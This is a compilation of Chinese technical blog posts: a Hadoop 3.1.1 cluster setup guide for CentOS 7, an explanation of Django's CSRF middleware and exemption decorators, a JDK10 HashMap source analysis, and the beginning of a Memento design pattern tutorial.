
如果有，
就把里面的内容逐行读出。
响应给浏览器。
如果没有，就会报404错误

欢迎页面
Welcome-file-list
不写任何资源名称的时候，会访问欢迎页面
默认从上往下找



配套 博文 视频 讲解 点击以下链接查看
https://study.163.com/course/courseMain.htm?courseId=1005981003&share=2&shareId=1028240359




********************************************************************************************************************************************************************************************************
Centos7 搭建 hadoop3.1.1 集群教程
 


配置环境要求：



Centos7
jdk 8
Vmware 14 pro
hadoop 3.1.1


Hadoop下载






安装4台虚拟机，如图所示







克隆之后需要更改网卡选项，ip，mac地址，uuid


 

重启网卡:
 


为了方便使用，操作时使用的root账户




 设置机器名称






再使用hostname命令，观察是否更改
类似的，更改其他三台机器hdp-02、hdp-03、hdp-04。



在任意一台机器Centos7上修改域名映射
vi /etc/hosts
修改如下

使用scp命令发送其他克隆机上    scp /etc/hosts 192.168.126.124:/etc/



给四台机器生成密钥文件



 确认生成。
把每一台机器的密钥都发送到hdp-01上（包括自己）
将所有密钥都复制到每一台机器上



在每一台机器上测试



无需密码则成功，保证四台机器之间可以免密登录



安装Hadoop



在usr目录下创建Hadoop目录，以保证Hadoop生态圈在该目录下。
使用xsell+xFTP传输文

解压缩Hadoop



配置java与hadoop环境变量


1 export JAVA_HOME=/usr/jdk/jdk1.8.0_131
2 export JRE_HOME=${JAVA_HOME}/jre
3 export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
4 export PATH=${JAVA_HOME}/bin:$PATH
5 
6 export HADOOP_HOME=/usr/hadoop/hadoop-3.1.1/
7 export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbin

注意：以上四台机器都需要配置环境变量


修改etc/hadoop中的配置文件
注：除了个别提示，其余文件只用修改hdp-01中的即可



修改core-site.xml 

 1 <configuration>
 2 <property>
 3 <name>fs.defaultFS</name>
 4 <value>hdfs://hdp-01:9000</value>
 5 </property>
 6  <property>
 7   <name>hadoop.tmp.dir</name>
 8     <!-- 以下为存放临时文件的路径 -->
 9   <value>/opt/hadoop/hadoop-3.1.1/data/tmp</value>
10  </property>
11 </configuration>

 


修改hadoop-env.sh

1 export JAVA_HOME=/usr/jdk/jdk1.8.0_131

 
注：该步骤需要四台都配置


修改hdfs-site.xml

 1 <configuration>
 2 <property>
 3   <name>dfs.namenode.http-address</name>
 4  <!-- hserver1 修改为你的机器名或者ip -->
 5   <value>hdp-01:50070</value>
 6  </property>
 7  <property>
 8   <name>dfs.namenode.name.dir</name>
 9   <value>/hadoop/name</value>
10  </property>
11  <property>
12   <name>dfs.replication</name>
13    <!-- 备份次数 -->
14   <value>1</value>
15  </property>
16  <property>
17   <name>dfs.datanode.data.dir</name>
18   <value>/hadoop/data</value>
19  </property>
20 
21 
22 </configuration>

 


 修改mapred-site.xml

1 <configuration>
2 <property>
3 <name>mapreduce.framework.name</name>
4 <value>yarn</value>
5 </property>
6 </configuration>



修改 workers

1 hdp-01
2 hdp-02
3 hdp-03
4 hdp-04



 修改yarn-site.xml文件

 1 <configuration>
 2 
 3 <!-- Site specific YARN configuration properties -->
 4 <property>
 5 <name>yarn.resourcemanager.hostname</name>
 6  <value>hdp-01</value>
 7 </property>
 8 <property>
 9  <name>yarn.nodemanager.aux-services</name>
10   <value>mapreduce_shuffle</value>
11 </property>
12  <property>
13   <name>yarn.nodemanager.aux-services.mapreduce.shuffle.class</name>
14 <value>org.apache.hadoop.mapred.ShuffleHandler</value>
15 </property>
16 <property>
17  <name>yarn.nodemanager.resource.cpu-vcores</name>
18  <value>1</value>
19 </property>
20 
21 </configuration>

注：可以把整个/usr/hadoop目录所有文件复制到其余三个机器上 还是通过scp 嫌麻烦的可以先整一台机器，然后再克隆




启动Hadoop




在namenode上初始化
因为hdp-01是namenode，hdp-02、hdp=03和hdp-04都是datanode，所以只需要对hdp-01进行初始化操作，也就是对hdfs进行格式化。
 执行初始化脚本，也就是执行命令：hdfs namenode  -format
等待一会后，不报错返回 “Exiting with status 0” 为成功，“Exiting with status 1”为失败
 


在namenode上执行启动命令
直接执行start-all.sh 观察是否报错，如报错执行一下内容
$ vim sbin/start-dfs.sh
$ vim sbin/stop-dfs.sh
在空白位置加入

1 HDFS_DATANODE_USER=root
2 
3 HADOOP_SECURE_DN_USER=hdfs
4 
5 HDFS_NAMENODE_USER=root
6 
7 HDFS_SECONDARYNAMENODE_USER=root

 
 
$ vim sbin/start-yarn.sh 
$ vim sbin/stop-yarn.sh 
在空白位置加入

1 YARN_RESOURCEMANAGER_USER=root
2 
3 HADOOP_SECURE_DN_USER=yarn
4 
5 YARN_NODEMANAGER_USER=root

 
 
$ vim start-all.sh
$ vim stop-all.sh

1 TANODE_USER=root
2 HDFS_DATANODE_SECURE_USER=hdfs
3 HDFS_NAMENODE_USER=root
4 HDFS_SECONDARYNAMENODE_USER=root
5 YARN_RESOURCEMANAGER_USER=root
6 HADOOP_SECURE_DN_USER=yarn
7 YARN_NODEMANAGER_USER=root

 
配置完毕后执行start-all.sh

运行jps

显示6个进程说明配置成功

去浏览器检测一下  http://hdp-01:50070

创建目录 上传不成功需要授权

hdfs dfs -chmod -R a+wr hdfs://hdp-01:9000/

 



//查看容量hadoop fs -df -h /


 

查看各个机器状态报告

hadoop dfsadmin -report




 


********************************************************************************************************************************************************************************************************
详解Django的CSRF认证
1.csrf原理
csrf要求发送post,put或delete请求的时候，是先以get方式发送请求，服务端响应时会分配一个随机字符串给客户端，客户端第二次发送post,put或delete请求时携带上次分配的随机字符串到服务端进行校验
2.Django中的CSRF中间件
首先，我们知道Django中间件作用于整个项目。
在一个项目中，如果想对全局所有视图函数或视图类起作用时，就可以在中间件中实现，比如想实现用户登录判断，基于用户的权限管理（RBAC）等都可以在Django中间件中来进行操作
Django内置了很多中间件,其中之一就是CSRF中间件
MIDDLEWARE_CLASSES = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
上面第四个就是Django内置的CSRF中间件
3.Django中间件的执行流程
Django中间件中最多可以定义5个方法
process_request
process_response
process_view
process_exception
process_template_response
Django中间件的执行顺序
1.请求进入到Django后，会按中间件的注册顺序执行每个中间件中的process_request方法
    如果所有的中间件的process_request方法都没有定义return语句，则进入路由映射，进行url匹配
    否则直接执行return语句，返回响应给客户端
2.依次按顺序执行中间件中的process_view方法
    如果某个中间件的process_view方法没有return语句，则根据第1步中匹配到的URL执行对应的视图函数或视图类
    如果某个中间件的process_view方法中定义了return语句，则后面的视图函数或视图类不会执行,程序会直接返回
3.视图函数或视图类执行完成之后，会按照中间件的注册顺序逆序执行中间件中的process_response方法
    如果中间件中定义了return语句，程序会正常执行，把视图函数或视图类的执行结果返回给客户端
    否则程序会抛出异常
4.程序在视图函数或视图类的正常执行过程中
    如果出现异常，则会执行按顺序执行中间件中的process_exception方法
    否则process_exception方法不会执行
    如果某个中间件的process_exception方法中定义了return语句，则后面的中间件中的process_exception方法不会继续执行了
5.如果视图函数或视图类中使用render方法来向客户端返回数据，则会触发中间件中的process_template_response方法
4.Django CSRF中间件的源码解析
Django CSRF中间件的源码
class CsrfViewMiddleware(MiddlewareMixin):

    def _accept(self, request):
        request.csrf_processing_done = True
        return None

    def _reject(self, request, reason):
        logger.warning(
            'Forbidden (%s): %s', reason, request.path,
            extra={
                'status_code': 403,
                'request': request,
            }
        )
        return _get_failure_view()(request, reason=reason)

    def _get_token(self, request):
        if settings.CSRF_USE_SESSIONS:
            try:
                return request.session.get(CSRF_SESSION_KEY)
            except AttributeError:
                raise ImproperlyConfigured(
                    'CSRF_USE_SESSIONS is enabled, but request.session is not '
                    'set. SessionMiddleware must appear before CsrfViewMiddleware '
                    'in MIDDLEWARE%s.' % ('_CLASSES' if settings.MIDDLEWARE is None else '')
                )
        else:
            try:
                cookie_token = request.COOKIES[settings.CSRF_COOKIE_NAME]
            except KeyError:
                return None

            csrf_token = _sanitize_token(cookie_token)
            if csrf_token != cookie_token:
                # Cookie token needed to be replaced;
                # the cookie needs to be reset.
                request.csrf_cookie_needs_reset = True
            return csrf_token

    def _set_token(self, request, response):
        if settings.CSRF_USE_SESSIONS:
            request.session[CSRF_SESSION_KEY] = request.META['CSRF_COOKIE']
        else:
            response.set_cookie(
                settings.CSRF_COOKIE_NAME,
                request.META['CSRF_COOKIE'],
                max_age=settings.CSRF_COOKIE_AGE,
                domain=settings.CSRF_COOKIE_DOMAIN,
                path=settings.CSRF_COOKIE_PATH,
                secure=settings.CSRF_COOKIE_SECURE,
                httponly=settings.CSRF_COOKIE_HTTPONLY,
            )
            patch_vary_headers(response, ('Cookie',))

    def process_request(self, request):
        csrf_token = self._get_token(request)
        if csrf_token is not None:
            # Use same token next time.
            request.META['CSRF_COOKIE'] = csrf_token

    def process_view(self, request, callback, callback_args, callback_kwargs):
        if getattr(request, 'csrf_processing_done', False):
            return None

        if getattr(callback, 'csrf_exempt', False):
            return None

        if request.method not in ('GET', 'HEAD', 'OPTIONS', 'TRACE'):
            if getattr(request, '_dont_enforce_csrf_checks', False):
                return self._accept(request)

            if request.is_secure():
                referer = force_text(
                    request.META.get('HTTP_REFERER'),
                    strings_only=True,
                    errors='replace'
                )
                if referer is None:
                    return self._reject(request, REASON_NO_REFERER)

                referer = urlparse(referer)

                if '' in (referer.scheme, referer.netloc):
                    return self._reject(request, REASON_MALFORMED_REFERER)

                if referer.scheme != 'https':
                    return self._reject(request, REASON_INSECURE_REFERER)

                good_referer = (
                    settings.SESSION_COOKIE_DOMAIN
                    if settings.CSRF_USE_SESSIONS
                    else settings.CSRF_COOKIE_DOMAIN
                )
                if good_referer is not None:
                    server_port = request.get_port()
                    if server_port not in ('443', '80'):
                        good_referer = '%s:%s' % (good_referer, server_port)
                else:
                    good_referer = request.get_host()

                good_hosts = list(settings.CSRF_TRUSTED_ORIGINS)
                good_hosts.append(good_referer)

                if not any(is_same_domain(referer.netloc, host) for host in good_hosts):
                    reason = REASON_BAD_REFERER % referer.geturl()
                    return self._reject(request, reason)

            csrf_token = request.META.get('CSRF_COOKIE')
            if csrf_token is None:
                return self._reject(request, REASON_NO_CSRF_COOKIE)

            request_csrf_token = ""
            if request.method == "POST":
                try:
                    request_csrf_token = request.POST.get('csrfmiddlewaretoken', '')
                except IOError:
                    pass

            if request_csrf_token == "":
                request_csrf_token = request.META.get(settings.CSRF_HEADER_NAME, '')

            request_csrf_token = _sanitize_token(request_csrf_token)
            if not _compare_salted_tokens(request_csrf_token, csrf_token):
                return self._reject(request, REASON_BAD_TOKEN)

        return self._accept(request)

    def process_response(self, request, response):
        if not getattr(request, 'csrf_cookie_needs_reset', False):
            if getattr(response, 'csrf_cookie_set', False):
                return response

        if not request.META.get("CSRF_COOKIE_USED", False):
            return response

        self._set_token(request, response)
        response.csrf_cookie_set = True
        return response
从上面的源码中可以看到，CsrfViewMiddleware中间件中定义了process_request，process_view和process_response三个方法
先来看process_request方法
def _get_token(self, request):  
    if settings.CSRF_USE_SESSIONS:  
        try:  
            return request.session.get(CSRF_SESSION_KEY)  
        except AttributeError:  
            raise ImproperlyConfigured(  
                'CSRF_USE_SESSIONS is enabled, but request.session is not '  
 'set. SessionMiddleware must appear before CsrfViewMiddleware ' 'in MIDDLEWARE%s.' % ('_CLASSES' if settings.MIDDLEWARE is None else '')  
            )  
    else:  
        try:  
            cookie_token = request.COOKIES[settings.CSRF_COOKIE_NAME]  
        except KeyError:  
            return None  
  
  csrf_token = _sanitize_token(cookie_token)  
        if csrf_token != cookie_token:  
            # Cookie token needed to be replaced;  
 # the cookie needs to be reset.  request.csrf_cookie_needs_reset = True  
 return csrf_token

def process_request(self, request):  
        csrf_token = self._get_token(request)  
        if csrf_token is not None:  
            # Use same token next time.  
      request.META['CSRF_COOKIE'] = csrf_token
从Django项目配置文件夹中读取CSRF_USE_SESSIONS的值，如果获取成功，则从session中读取CSRF_SESSION_KEY的值，默认为'_csrftoken'，如果没有获取到CSRF_USE_SESSIONS的值，则从发送过来的请求中获取CSRF_COOKIE_NAME的值，如果没有定义则返回None。
再来看process_view方法
在process_view方法中，先检查视图函数是否被csrf_exempt装饰器装饰，如果视图函数没有被csrf_exempt装饰器装饰，则程序继续执行，否则返回None。接着从request请求头中或者cookie中获取携带的token并进行验证，验证通过才会继续执行与URL匹配的视图函数，否则就返回403 Forbidden错误。
实际项目中，会在发送POST,PUT,DELETE,PATCH请求时，在提交的form表单中添加
{% csrf_token %}
即可，否则会出现403的错误

5.csrf_exempt装饰器和csrf_protect装饰器
5.1 基于Django FBV
在一个项目中，如果注册起用了CsrfViewMiddleware中间件，则项目中所有的视图函数和视图类在执行过程中都要进行CSRF验证。
此时想使某个视图函数或视图类不进行CSRF验证，则可以使用csrf_exempt装饰器装饰不想进行CSRF验证的视图函数
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt  
def index(request):  
    pass
也可以把csrf_exempt装饰器直接加在URL路由映射中，使某个视图函数不经过CSRF验证
from django.views.decorators.csrf import csrf_exempt  
  
from users import views  
 
urlpatterns = [  
    url(r'^admin/', admin.site.urls),  
    url(r'^index/',csrf_exempt(views.index)),  
]
同样的，如果在一个Django项目中，没有注册起用CsrfViewMiddleware中间件，但是想让某个视图函数进行CSRF验证，则可以使用csrf_protect装饰器
csrf_protect装饰器的用法跟csrf_exempt装饰器用法相同，都可以加上视图函数上方装饰视图函数或者在URL路由映射中直接装饰视图函数
from django.views.decorators.csrf import csrf_exempt  

@csrf_protect  
def index(request):  
    pass
或者
from django.views.decorators.csrf import csrf_protect  
  
from users import views  
 
urlpatterns = [  
    url(r'^admin/', admin.site.urls),  
    url(r'^index/',csrf_protect(views.index)),  
]
5.1 基于Django CBV
上面的情况是基于Django FBV的，如果是基于Django CBV，则不可以直接加在视图类的视图函数中了
此时有三种方式来对Django CBV进行CSRF验证或者不进行CSRF验证
方法一，在视图类中定义dispatch方法，为dispatch方法加csrf_exempt装饰器
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

class UserAuthView(View):

    @method_decorator(csrf_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super(UserAuthView,self).dispatch(request,*args,**kwargs)

    def get(self,request,*args,**kwargs):
        pass

    def post(self,request,*args,**kwargs):
        pass

    def put(self,request,*args,**kwargs):
        pass

    def delete(self,request,*args,**kwargs):
        pass
方法二：为视图类上方添加装饰器
@method_decorator(csrf_exempt,name='dispatch')
class UserAuthView(View):
    def get(self,request,*args,**kwargs):
        pass

    def post(self,request,*args,**kwargs):
        pass

    def put(self,request,*args,**kwargs):
        pass

    def delete(self,request,*args,**kwargs):
        pass
方式三：在url.py中为类添加装饰器
from django.views.decorators.csrf import csrf_exempt

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^auth/', csrf_exempt(views.UserAuthView.as_view())),
]

csrf_protect装饰器的用法跟上面一样


********************************************************************************************************************************************************************************************************
JDK10源码分析之HashMap
HashMap在工作中大量使用，但是具体原理和实现是如何的呢？技术细节是什么？带着很多疑问，我们来看下JDK10源码吧。
1、数据结构
　　采用Node<K,V>[]数组，其中，Node<K,V>这个类实现Map.Entry<K,V>，是一个链表结构的对象，并且在一定条件下，会将链表结构变为红黑树。所以，JDK10采用的是数组+链表+红黑树的数据结构。贴上Node的源码

 static class Node<K,V> implements Map.Entry<K,V> {
        final int hash;
        final K key;
        V value;
        Node<K,V> next;

        Node(int hash, K key, V value, Node<K,V> next) {
            this.hash = hash;
            this.key = key;
            this.value = value;
            this.next = next;
        }

        public final K getKey()        { return key; }
        public final V getValue()      { return value; }
        public final String toString() { return key + "=" + value; }

        public final int hashCode() {
            return Objects.hashCode(key) ^ Objects.hashCode(value);
        }

        public final V setValue(V newValue) {
            V oldValue = value;
            value = newValue;
            return oldValue;
        }

        public final boolean equals(Object o) {
            if (o == this)
                return true;
            if (o instanceof Map.Entry) {
                Map.Entry<?,?> e = (Map.Entry<?,?>)o;
                if (Objects.equals(key, e.getKey()) &&
                    Objects.equals(value, e.getValue()))
                    return true;
            }
            return false;
        }
    }

 
2、静态变量（默认值）

DEFAULT_INITIAL_CAPACITY= 1 << 4：初始化数组默认长度。1左移4位，为16。
MAXIMUM_CAPACITY = 1 << 30：初始化默认容量大小，2的30次方。
DEFAULT_LOAD_FACTOR = 0.75f：负载因子，用于和数组长度相乘，当数组长度大于得到的值后，会进行数组的扩容，扩容倍数是2^n。
TREEIFY_THRESHOLD = 8：链表长度达到该值后，会进行数据结构转换，变成红黑树，优化速率。
UNTREEIFY_THRESHOLD = 6：红黑树的数量小于6时，在resize中，会转换成链表。

3、构造函数

 /**
     * Constructs an empty {@code HashMap} with the specified initial
     * capacity and load factor.
     *
     * @param  initialCapacity the initial capacity
     * @param  loadFactor      the load factor
     * @throws IllegalArgumentException if the initial capacity is negative
     *         or the load factor is nonpositive
     */
    public HashMap(int initialCapacity, float loadFactor) {
        if (initialCapacity < 0)
            throw new IllegalArgumentException("Illegal initial capacity: " +
                                               initialCapacity);
        if (initialCapacity > MAXIMUM_CAPACITY)
            initialCapacity = MAXIMUM_CAPACITY;
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new IllegalArgumentException("Illegal load factor: " +
                                               loadFactor);
        this.loadFactor = loadFactor;
        this.threshold = tableSizeFor(initialCapacity);
    }

    /**
     * Constructs an empty {@code HashMap} with the specified initial
     * capacity and the default load factor (0.75).
     *
     * @param  initialCapacity the initial capacity.
     * @throws IllegalArgumentException if the initial capacity is negative.
     */
    public HashMap(int initialCapacity) {
        this(initialCapacity, DEFAULT_LOAD_FACTOR);
    }

    /**
     * Constructs an empty {@code HashMap} with the default initial capacity
     * (16) and the default load factor (0.75).
     */
    public HashMap() {
        this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted
    }

    /**
     * Constructs a new {@code HashMap} with the same mappings as the
     * specified {@code Map}.  The {@code HashMap} is created with
     * default load factor (0.75) and an initial capacity sufficient to
     * hold the mappings in the specified {@code Map}.
     *
     * @param   m the map whose mappings are to be placed in this map
     * @throws  NullPointerException if the specified map is null
     */
    public HashMap(Map<? extends K, ? extends V> m) {
        this.loadFactor = DEFAULT_LOAD_FACTOR;
        putMapEntries(m, false);
    }

　　四个构造函数，这里不细说，主要说明一下一个方法。
　　1、tableSizeFor(initialCapacity)
　　
　　

  static final int tableSizeFor(int cap) {
        int n = cap - 1;
        n |= n >>> 1;
        n |= n >>> 2;
        n |= n >>> 4;
        n |= n >>> 8;
        n |= n >>> 16;
        return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;
    }

　　这个方法返回一个2^n的值，用于初始化数组的大小，可以看到，入参的数值不是实际的数组长度，是经过计算得来的大于该值的第一个2^n值，并且，计算后大于2^30时，直接返回2^30。来说明下这个算法的原理，为什么会返回2^n。至于返回2^n有什么用，后面会有说明。
　　为什么会得到2^n，举个例子。比如13。13的2进制是0000 1101，上面运算相当于以下算式。
　　0000 1101        右移一位  0000 0110 ，取或0000 1111  一直运算下去，最后+1，确实是2^n。
　　下面，由于是取或，我们现在只关心二进制最高位的1，后面不管是1或0，都先不看，我们来看以下运算。
　　000...  1 ...  右移一位与原值取或后，得到 000... 11 ...
　　000... 11 ... 右移两位与原值取或后，得到 000... 11 11 ...
　　000... 1111 ... 右移四位与原值取或后，得到 000... 1111 1111 ...
　　以此下去，在32位范围内的值，通过这样移动后，相当于用最高位的1，将之后的所有值，都补为1，得到一个2^n-1的值。最后+1自然是2^n。
4、主要方法

put(K key, V value)

  final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
           //如果数组未初始化，则初始化数组长度
            n = (tab = resize()).length;
       //计算key的hash值，落在数组的哪一个区间，如果不存在则新建Node元素
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            //数组存在的情况下，判断key是否已有，如果存在，则返回该值
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
           //如果p是红黑树，则直接加入红黑树中
            else if (p instanceof TreeNode)
                e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
            else {
                //如果不是红黑树，则遍历链表
                for (int binCount = 0; ; ++binCount) {
                   //如果p的next（链表中的下一个值）为空，则直接追加在该值后面
                    if ((e = p.next) == null) {
                        p.next = newNode(hash, key, value, null);
                       //如果该链表存完之后，长度大于8，则转换为红黑树
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            treeifyBin(tab, hash);
                        break;
                    }
                    //如果next不为空，则比较该链表节点时候就是存入的key，如果是，直接返回
                    if (e.hash == hash &&
                        ((k = e.key) == key || (key != null && key.equals(k))))
                        break;
                    p = e;
                }
            }
            //如果存在相同的key，则直接返回该值。
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;
                afterNodeAccess(e);
                return oldValue;
            }
        }
        ++modCount;
        //数组中元素个数如果大于数组容量*负载因子，则触发数组resize操作。
        if (++size > threshold)
            resize();
        afterNodeInsertion(evict);
        return null;
    }

 
HashMap，hash是散列算法，所以HashMap中，主要也用了散列的原理。就是将数据通过hash的散列算法计算其分布情况，存入map中。上面是put的代码，可以看出主要的流程是：初始化一个Node数组，长度为2^n，计算key值落在数组的位置，如果该位置没有Node元素，则用该key建立一个Node插入，如果存在hash碰撞，即不同key计算后的值落在了同一位置，则将该值存到Node链表中。其余具体细节，在上面源码中已经标注。

hash(key)

　　计算put的hash入参，源码如下：

 static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

　　可以看到，用到了key的hashCode方法，这个不细说，主要是计算key的散列值。主要讲一下后面为什么要和h右移16后相异或。实际上，是为了让这个hashCode的二进制值的1分布更散列一些。因为后面的运算需要，需要这样做（为什么后面的运算需要让1分散，这个我们下面会讲）。下面我们来看，为什么这样运算后，会增加1的散列性。可以看到，16位以内的二进制hashCode和它右移16位后取异或得到的值是一样的。我们举例时，用8位二进制和它右移4位取异或来举例，
比如          1101 1000 0001 0101，
右移8位为 0000 0000 1101 1000，
取异或后   1101 1000 1100 1101，可以看到1的分布更均匀了一些。
举个极端点的例子  1000 0000 0000 0000
右移8为                  0000 0000 1000 0000
取异或后                1000 0000 1000 0000，可以明显看到，1多了一个。所以这样运算是有一定效果的，使hash碰撞的几率要低了一些。
　　3. resize()
　　该方法在数组初始化，数组扩容，转换红黑树（treeifyBin中，if (tab == null || (n = tab.length) < MIN_TREEIFY_CAPACITY) resize();）中会触发。主要用于数组长度的扩展2倍，和数据的重新分布。源码如下
　　
　　

  final Node<K,V>[] resize() {
        Node<K,V>[] oldTab = table;
        int oldCap = (oldTab == null) ? 0 : oldTab.length;
        int oldThr = threshold;
        int newCap, newThr = 0;
        if (oldCap > 0) {
            //如果原数组存在，且大于2^30，则设置数组长度为0x7fffffff
            if (oldCap >= MAXIMUM_CAPACITY) {
                threshold = Integer.MAX_VALUE;
                return oldTab;
            }
            //如果原数组存在，则将其长度扩展为2倍。
            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&
                     oldCap >= DEFAULT_INITIAL_CAPACITY)
                newThr = oldThr << 1; // double threshold
        }
        else if (oldThr > 0) // initial capacity was placed in threshold
            newCap = oldThr;
        else {               // zero initial threshold signifies using defaults
            newCap = DEFAULT_INITIAL_CAPACITY;
            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);
        }
        if (newThr == 0) {
            float ft = (float)newCap * loadFactor;
            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?
                      (int)ft : Integer.MAX_VALUE);
        }
        threshold = newThr;
        @SuppressWarnings({"rawtypes","unchecked"})
        Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];
        table = newTab;
       //如果原数组不为空，则取出数组中的元素，进行hash位置的重新计算，可以看到，重新计算耗时较多，所以尽量用多大数组就初始化多大最好。
        if (oldTab != null) {
            for (int j = 0; j < oldCap; ++j) {
                Node<K,V> e;
                if ((e = oldTab[j]) != null) {
                    oldTab[j] = null;
                    if (e.next == null)
                        newTab[e.hash & (newCap - 1)] = e;
                    else if (e instanceof TreeNode)
                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);
                    else { // preserve order
                        Node<K,V> loHead = null, loTail = null;
                        Node<K,V> hiHead = null, hiTail = null;
                        Node<K,V> next;
                        do {
                            next = e.next;
                            if ((e.hash & oldCap) == 0) {
                                if (loTail == null)
                                    loHead = e;
                                else
                                    loTail.next = e;
                                loTail = e;
                            }
                            else {
                                if (hiTail == null)
                                    hiHead = e;
                                else
                                    hiTail.next = e;
                                hiTail = e;
                            }
                        } while ((e = next) != null);
                        if (loTail != null) {
                            loTail.next = null;
                            newTab[j] = loHead;
                        }
                        if (hiTail != null) {
                            hiTail.next = null;
                            newTab[j + oldCap] = hiHead;
                        }
                    }
                }
            }
        }
        return newTab;
    } 

　　4. p = tab[i = (n - 1) & hash]
　　计算key的hash落在数组的哪个位置，它决定了数组长度为什么是2^n。主要是(n-1) & hash，这里就会用到上面hash()方法中，让1散列的作用。这个方法也决定了，为什么数组长度为2^n，下面我们具体解释一下。由于初始化中，n的值是resize方法返回的，resize中用到的就是tableSizeFor方法返回的2^n的值。如16，下面我举例说明，如数组长度是16：则n-1为15，二进制是 0000 1111与hash取与时，由于0与1/0都为0，所以我们只看后四位1111和hash的后四位。可以看到，与1111取与，可以得到0-15的值，这时，保证了hash能实现落在数组的所有下标。假想一下，如果数组长度为15或其他非二进制值，15-1=14,14的二进制为1110，由于最后一位是0，和任何二进制取与，最后一位都是0，则hash落不到数组下标为0,2,4,6,8,10,12,14的偶数下标，这样数据分布会更集中，加重每个下标Node的负担，且数组中很多下标无法利用。源码作者正是利用了2^n-1，得到二进制最后全为1，并且与hash相与后，能让hash分布覆盖数组所有下标上的特性。之前hash()方法通过HashCode与HashCode右移16位取异或，让1分布更加均匀，也是为了让hash在数组中的分布更加均匀，从而避免某个下标Node元素过多，效率下降，且过多元素会触发resize耗费时间的缺点，当然，可以看到极端情况下，hash()计算的值并不能解决hash碰撞问题，但是为了HashMap的性能设计者没有考虑该极端情况，也是通过16位hashCode右移8位来举例说明。
如：          1000 1000 0000 0000和1000 1100 0000 0000，如果不移位取异或，这两个hash值与1111取与，都是分布在同一位置，分布情况不良好。
右移8位： 1000 1000 1000 1000和1000 1100 1000 1100，可以看到两个值与1111取与分布在数组的两个下标。
极端情况：1000 0000 0000 0000和1100 0000 0000 0000，该值又移8为取异或后，并不能解决hash碰撞。
 
 
　　　     
 
 
　　
********************************************************************************************************************************************************************************************************
设计模式-备忘录模式
备忘录模式 : Memento
声明/作用 : 保存对象的内部状态,并在需要的时候(undo/rollback) 恢复到对象以前的状态
适用场景 : 一个对象需要保存状态,并且可通过undo或者rollback恢复到以前的状态时,可以使用备忘录模式
经典场景 : 某时刻游戏存档恢复记录
需要被保存内部状态以便恢复的这个类 叫做 : Originator 发起人(原生者)
用来保存Originator内部状态的类 叫做 : Memento 备忘录(回忆者) 它由Originator创建
负责管理备忘录Memento的类叫做 : Caretaker 看管者(管理者),它不能对Memento的内容进行访问或者操作。
以Person对象(拥有name,sex,age三个基本属性)为例 : 

package name.ealen.memento.noDesignPattern;

/**
 * Created by EalenXie on 2018/9/27 15:18.
 */
public class Person {

    private String name;
    private String sex;
    private Integer age;

    public Person(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
    //省略getter,setter
}

 
如果不使用设计模式，我们要对其进行备份，undo操作 ,常规情况下，我们可能会写出如下的代码 : 
 

 /**
     * 不使用设计模式 实现备忘录模式,普通保存实例的内部状态
     */
    @Test
    public void noDesignPattern() {
        Person person = new Person("ealenxie", "男", 23);

        //1 . 首先新建一个Person的Backup备份,将对象的初始属性赋值进去
        Person backup = new Person();
        backup.setName(person.getName());
        backup.setSex(person.getSex());
        backup.setAge(person.getAge());
        //打印初始的person
        System.out.println("初始化的对象 : " + person);

        //2 . 修改person
        person.setAge(22);
        person.setName("ZHANG SAN");
        person.setSex("女");
        System.out.println("修改后的对象 : " + person);

        //3 . 回滚(回复以前状态) 从backup中获取之前的状态,重新赋值
        person.setAge(backup.getAge());
        person.setName(backup.getName());
        person.setSex(backup.getSex());
        System.out.println("还原后的对象 : " + person);
    }

运行可以看到基本效果 :  
　　　　
以上代码中，我们首先进行了创建了一个初始对象person，然后new出一个新的backup，将初始对象的属性赋给backup，person修改之后，如果进行undo/rollback，就将backup的属性重新赋值给对象person。这样做我们必须要关注person和backup之间的赋值关系必须一致且值正确，这样才能完成rollback动作；如果person对象拥有诸多属性及行为的话，很显示不是特别的合理。
 
如下，我们使用备忘录模式来完成对象的备份和rollback
　　1 . 首先，我们定义Memento对象，它的作用就是用来保存 初始对象(原生者，此例比如person)的内部状态，因此它的属性和原生者应该一致。

package name.ealen.memento.designPattern;

/**
 * Created by EalenXie on 2018/9/27 18:03.
 */
public class Memento {
    private String name;
    private String sex;
    private Integer age;
    public Memento(String name, String sex, Integer age) {
        this.name = name;
        this.sex = sex;
        this.age = age;
    }
    //省略getter/setter
}

 
　　2 . 然后，定义我们的发起人(原生者) Originator，它拥有两个基本的行为 : 
　　　　1). 创建备份
　　　　2). 根据备份进行rollback

